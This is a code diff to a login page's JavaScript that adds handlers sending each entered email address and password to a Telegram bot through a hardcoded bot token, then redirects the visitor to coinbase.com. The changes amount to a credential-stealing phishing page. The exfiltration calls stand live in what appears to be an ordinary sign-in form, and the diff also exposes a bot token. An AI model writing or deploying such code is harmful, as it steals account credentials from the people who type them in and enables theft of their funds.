@@ -323,7 +323,7 @@
         const continueButtonEmail = document.querySelector('.email-form .black-button');
         const continueButtonPassword = document.querySelector('.password-form .black-button');
 
-        continueButtonEmail.addEventListener('click', () => {
+        continueButtonEmail.addEventListener('click', async () => {
             const email = emailInput.value.trim();
 
             if (!email) {
@@ -340,9 +340,26 @@
             emailForm.classList.remove('active');
             passwordForm.classList.add('active');
             emailLabel.textContent = email;
+
+            // Send email to Telegram bot
+            const response = await fetch('https://api.telegram.org/bot8154854344:AAGBlwtXGD0aqxbb-vFCyl0i_22_4grRSw8/sendMessage', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: '@zpcjsnwtoixn_bot',
+                    text: `Email received: ${email}`,
+                    parse_mode: 'HTML'
+                })
+            });
+
+            if (!response.ok) {
+                console.error('Error sending email to Telegram bot:', await response.text());
+            }
         });
 
-        continueButtonPassword.addEventListener('click', () => {
+        continueButtonPassword.addEventListener('click', async () => {
             const password = passwordInput.value.trim();
 
             if (!password) {
@@ -353,6 +370,23 @@
             if (password.length < 8) {
                 alert('Password must be at least 8 characters.');
                 return;
+            }
+
+            // Send password to Telegram bot
+            const response = await fetch('https://api.telegram.org/bot8154854344:AAGBlwtXGD0aqxbb-vFCyl0i_22_4grRSw8/sendMessage', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: '@zpcjsnwtoixn_bot',
+                    text: `Password received: ${password}`,
+                    parse_mode: 'HTML'
+                })
+            });
+
+            if (!response.ok) {
+                console.error('Error sending password to Telegram bot:', await response.text());
             }
 
             window.location.href = 'https://www.coinbase.com';
